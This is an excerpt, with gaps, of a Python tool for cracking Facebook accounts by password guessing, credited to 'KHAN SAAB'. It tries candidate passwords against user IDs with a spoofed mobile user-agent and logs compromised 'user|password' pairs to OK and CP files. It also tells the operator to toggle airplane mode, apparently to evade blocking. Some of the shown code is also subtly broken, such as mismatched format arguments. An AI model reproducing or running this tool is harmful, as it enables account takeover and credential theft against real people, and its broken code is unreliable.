...
\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m        KHAN. SAAB
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           Yaseen-Saab
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mKHANSAAB_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mKHANSAAB_CP.txt' % (H, P, str(len(cp))))
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;32m[KHANSAAB] {loop}|{len(self.id)} ok[{len(ok)}] cp[{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                header = {
                    ...
                    "user-agent":"Mozilla/5.0 (Linux; Android 10; TECNO W5006S Build/QP1A.190711.020+",
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [KHANSAAB-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('KHANSAAB_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [KHANSABB-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('KHANSAAB_CP.txt' , 'a').write('%s\n' % wrt)
                        break
                        ...
                        pass
                    print('\r%s [KHANSAAB-CP] %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('KHANSAAB_CP.txt' , 'a').write('%s\n' % wrt)
                    break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            os.system("clear")
            print(logo)
            print("\033[1;32m\rUse flight (airplane) mode before use\033[1;37m")
            print(47*"-")
